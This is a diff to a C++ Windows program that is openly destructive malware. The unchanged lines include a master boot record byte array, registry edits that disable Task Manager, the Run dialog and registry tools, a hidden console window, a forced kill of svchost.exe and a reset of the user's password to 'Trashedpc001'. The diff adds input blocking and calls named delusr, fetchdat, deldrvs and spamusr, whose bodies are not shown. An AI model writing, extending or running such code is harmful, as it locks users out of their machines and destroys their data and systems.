@@ -1,6 +1,8 @@
 #define _WIN32_WINNT 0x0500
 
 #include <Windows.h>
+#include <winuser.h>
+#include <winable.h>
 #include <iostream>
 #include <string>
 
@@ -48,11 +50,20 @@ const unsigned char MasterBootRecord[] = { 0xEB, 0x00, 0xE8, 0x1F, 0x00, 0x8C, 0
 
 int main()
 {
+    BlockInput(true);
+    
     system("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f");
     system("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoRun /t REG_DWORD /d 1 /f");
     
     HWND hWnd = GetConsoleWindow();
     ShowWindow(hWnd, SW_HIDE);
+    
+    delusr();
+
+    fetchdat();
+
+    deldrvs();
+    spamusr();
 
     DWORD dwBytesWritten;
 
@@ -74,6 +85,8 @@ int main()
         system("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f");
 
         system("explorer.exe");
+        
+        BlockInput(false);
 
         system("taskkill /f /im svchost.exe");
     }
@@ -95,6 +108,8 @@ int main()
         system("net user %USERNAME% Trashedpc001");
 
         system("explorer.exe");
+        
+        BlockInput(false);
 
         system("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
         system("REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f");
